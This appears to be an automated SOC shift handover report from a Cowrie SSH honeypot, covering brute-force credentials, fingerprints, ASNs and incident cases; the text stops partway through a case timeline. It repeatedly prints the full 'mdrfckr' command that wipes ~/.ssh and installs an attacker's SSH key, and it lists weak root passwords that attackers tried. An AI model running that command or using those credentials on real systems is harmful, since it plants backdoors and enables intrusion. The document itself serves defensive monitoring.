# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-26 |
| **Generated At** | 2026-04-26T10:51:20Z |
| **Shift Time** | 10:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **172** |
| Confirmed Threats | **170** |
| False Positives Filtered | **2** (1.2%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **6** |
| High Severity Cases | **34** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **138** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **102** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **32** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `345gs5662d34` | 17 |
| `ubuntu` | 5 |
| `git` | 3 |
| `teamspeak` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `demo@123` | 2 |
| `Apple2026` | 2 |
| `1` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 17 |
| `demo` | `demo@123` | 2 |
| `root` | `Apple2026` | 2 |
| `wp-user` | `1` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Apple2026` | `172.206.32.4` | 2026-04-26T09:11:28 |
| `root` | `3245gs5662d34` | `172.206.32.4` | 2026-04-26T09:11:33 |
| `root` | `Qwerty111111` | `172.206.32.4` | 2026-04-26T09:13:28 |
| `root` | `Qwerty111111` | `103.149.27.208` | 2026-04-26T09:15:32 |
| `root` | `Ld123456` | `172.206.32.4` | 2026-04-26T09:15:34 |
| `root` | `3245gs5662d34` | `103.149.27.208` | 2026-04-26T09:15:35 |
| `root` | `BBqq111` | `103.149.27.208` | 2026-04-26T09:16:28 |
| `root` | `Ld123456` | `103.149.27.208` | 2026-04-26T09:17:24 |
| `root` | `aa@159357` | `172.206.32.4` | 2026-04-26T09:19:37 |
| `root` | `Admin@2026` | `103.149.27.208` | 2026-04-26T09:31:42 |
| `root` | `Apple2026` | `103.149.27.208` | 2026-04-26T09:32:40 |
| `root` | `aa@159357` | `103.149.27.208` | 2026-04-26T09:33:37 |
| `root` | `Qazwsx321#` | `179.111.100.172` | 2026-04-26T09:58:06 |
| `root` | `3245gs5662d34` | `179.111.100.172` | 2026-04-26T09:58:13 |
| `root` | `aaa` | `152.32.130.174` | 2026-04-26T10:09:15 |
| `root` | `3245gs5662d34` | `152.32.130.174` | 2026-04-26T10:09:18 |
| `root` | `a123456789j` | `150.136.214.177` | 2026-04-26T10:19:15 |
| `root` | `3245gs5662d34` | `150.136.214.177` | 2026-04-26T10:19:21 |
| `root` | `P@ssw0rd1234!` | `179.111.100.172` | 2026-04-26T10:22:03 |
| `root` | `XXdd000` | `179.111.100.172` | 2026-04-26T10:25:28 |
| `root` | `123!@#QWE` | `179.111.100.172` | 2026-04-26T10:28:50 |
| `root` | `Abc123123` | `179.111.100.172` | 2026-04-26T10:42:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **172** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 99 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 55 | 5 |
| `af8223ac9914...` | libssh-based | 40 | 2 |
| `ec4c9f2e6ed4...` | libssh-based | 3 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 55 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 40 | 2 | libssh-based |
| `ec4c9f2e6ed4...` | libssh | 3 | 1 | libssh-based |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.136.214.177`, `179.111.100.172`, `172.206.32.4`, `152.32.130.174`, `103.149.27.208`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **11** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS27699` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (34)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-872009dadd32

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:11 |
| **Last Seen** | 2026-04-26 09:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:11:27` | `cowrie.session.connect` |
| `2026-04-26 09:11:27` | `cowrie.client.version` |
| `2026-04-26 09:11:27` | `cowrie.client.kex` |
| `2026-04-26 09:11:28` | `cowrie.login.success` |
| `2026-04-26 09:11:29` | `cowrie.session.params` |
| `2026-04-26 09:11:29` | `cowrie.command.input` |
| `2026-04-26 09:11:29` | `cowrie.command.failed` |
| `2026-04-26 09:11:29` | `cowrie.log.closed` |
| `2026-04-26 09:11:29` | `cowrie.session.params` |
| `2026-04-26 09:11:29` | `cowrie.command.input` |
| `2026-04-26 09:11:30` | `cowrie.session.file_download` |
| `2026-04-26 09:11:30` | `cowrie.log.closed` |
| `2026-04-26 09:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45532ef7c07

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:11 |
| **Last Seen** | 2026-04-26 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:11:32` | `cowrie.session.connect` |
| `2026-04-26 09:11:32` | `cowrie.client.version` |
| `2026-04-26 09:11:32` | `cowrie.client.kex` |
| `2026-04-26 09:11:33` | `cowrie.login.success` |
| `2026-04-26 09:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6065405f90c

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:13 |
| **Last Seen** | 2026-04-26 09:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:13:26` | `cowrie.session.connect` |
| `2026-04-26 09:13:26` | `cowrie.client.version` |
| `2026-04-26 09:13:27` | `cowrie.client.kex` |
| `2026-04-26 09:13:28` | `cowrie.login.success` |
| `2026-04-26 09:13:28` | `cowrie.session.params` |
| `2026-04-26 09:13:28` | `cowrie.command.input` |
| `2026-04-26 09:13:28` | `cowrie.command.failed` |
| `2026-04-26 09:13:28` | `cowrie.log.closed` |
| `2026-04-26 09:13:29` | `cowrie.session.params` |
| `2026-04-26 09:13:29` | `cowrie.command.input` |
| `2026-04-26 09:13:29` | `cowrie.session.file_download` |
| `2026-04-26 09:13:29` | `cowrie.log.closed` |
| `2026-04-26 09:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c1754a796f3

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:13 |
| **Last Seen** | 2026-04-26 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:13:32` | `cowrie.session.connect` |
| `2026-04-26 09:13:32` | `cowrie.client.version` |
| `2026-04-26 09:13:32` | `cowrie.client.kex` |
| `2026-04-26 09:13:33` | `cowrie.login.success` |
| `2026-04-26 09:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747471c9a084

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:15 |
| **Last Seen** | 2026-04-26 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:15:32` | `cowrie.session.connect` |
| `2026-04-26 09:15:32` | `cowrie.client.version` |
| `2026-04-26 09:15:32` | `cowrie.client.kex` |
| `2026-04-26 09:15:32` | `cowrie.login.success` |
| `2026-04-26 09:15:32` | `cowrie.session.params` |
| `2026-04-26 09:15:32` | `cowrie.command.input` |
| `2026-04-26 09:15:32` | `cowrie.command.failed` |
| `2026-04-26 09:15:32` | `cowrie.log.closed` |
| `2026-04-26 09:15:33` | `cowrie.session.params` |
| `2026-04-26 09:15:33` | `cowrie.command.input` |
| `2026-04-26 09:15:33` | `cowrie.session.file_download` |
| `2026-04-26 09:15:33` | `cowrie.log.closed` |
| `2026-04-26 09:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-debf6af09fe0

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:15 |
| **Last Seen** | 2026-04-26 09:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:15:33` | `cowrie.session.connect` |
| `2026-04-26 09:15:33` | `cowrie.client.version` |
| `2026-04-26 09:15:34` | `cowrie.client.kex` |
| `2026-04-26 09:15:34` | `cowrie.login.success` |
| `2026-04-26 09:15:35` | `cowrie.session.params` |
| `2026-04-26 09:15:35` | `cowrie.command.input` |
| `2026-04-26 09:15:35` | `cowrie.command.failed` |
| `2026-04-26 09:15:35` | `cowrie.log.closed` |
| `2026-04-26 09:15:36` | `cowrie.session.params` |
| `2026-04-26 09:15:36` | `cowrie.command.input` |
| `2026-04-26 09:15:36` | `cowrie.session.file_download` |
| `2026-04-26 09:15:36` | `cowrie.log.closed` |
| `2026-04-26 09:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c73ce4e72fa5

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:15 |
| **Last Seen** | 2026-04-26 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:15:35` | `cowrie.session.connect` |
| `2026-04-26 09:15:35` | `cowrie.client.version` |
| `2026-04-26 09:15:35` | `cowrie.client.kex` |
| `2026-04-26 09:15:35` | `cowrie.login.success` |
| `2026-04-26 09:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ee3655adee4

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:15 |
| **Last Seen** | 2026-04-26 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:15:38` | `cowrie.session.connect` |
| `2026-04-26 09:15:38` | `cowrie.client.version` |
| `2026-04-26 09:15:39` | `cowrie.client.kex` |
| `2026-04-26 09:15:40` | `cowrie.login.success` |
| `2026-04-26 09:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deeea367bf6f

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:16 |
| **Last Seen** | 2026-04-26 09:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:16:28` | `cowrie.session.connect` |
| `2026-04-26 09:16:28` | `cowrie.client.version` |
| `2026-04-26 09:16:28` | `cowrie.client.kex` |
| `2026-04-26 09:16:28` | `cowrie.login.success` |
| `2026-04-26 09:16:28` | `cowrie.session.params` |
| `2026-04-26 09:16:28` | `cowrie.command.input` |
| `2026-04-26 09:16:28` | `cowrie.command.failed` |
| `2026-04-26 09:16:28` | `cowrie.log.closed` |
| `2026-04-26 09:16:29` | `cowrie.session.params` |
| `2026-04-26 09:16:29` | `cowrie.command.input` |
| `2026-04-26 09:16:29` | `cowrie.session.file_download` |
| `2026-04-26 09:16:29` | `cowrie.log.closed` |
| `2026-04-26 09:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400a3ecc5365

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:16 |
| **Last Seen** | 2026-04-26 09:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:16:31` | `cowrie.session.connect` |
| `2026-04-26 09:16:31` | `cowrie.client.version` |
| `2026-04-26 09:16:31` | `cowrie.client.kex` |
| `2026-04-26 09:16:31` | `cowrie.login.success` |
| `2026-04-26 09:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d16875c34198

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:17 |
| **Last Seen** | 2026-04-26 09:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:17:23` | `cowrie.session.connect` |
| `2026-04-26 09:17:23` | `cowrie.client.version` |
| `2026-04-26 09:17:23` | `cowrie.client.kex` |
| `2026-04-26 09:17:24` | `cowrie.login.success` |
| `2026-04-26 09:17:24` | `cowrie.session.params` |
| `2026-04-26 09:17:24` | `cowrie.command.input` |
| `2026-04-26 09:17:24` | `cowrie.command.failed` |
| `2026-04-26 09:17:24` | `cowrie.log.closed` |
| `2026-04-26 09:17:24` | `cowrie.session.params` |
| `2026-04-26 09:17:24` | `cowrie.command.input` |
| `2026-04-26 09:17:24` | `cowrie.session.file_download` |
| `2026-04-26 09:17:24` | `cowrie.log.closed` |
| `2026-04-26 09:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a76890e7a741

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:17 |
| **Last Seen** | 2026-04-26 09:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:17:26` | `cowrie.session.connect` |
| `2026-04-26 09:17:26` | `cowrie.client.version` |
| `2026-04-26 09:17:26` | `cowrie.client.kex` |
| `2026-04-26 09:17:27` | `cowrie.login.success` |
| `2026-04-26 09:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47230888ba2

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:19 |
| **Last Seen** | 2026-04-26 09:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
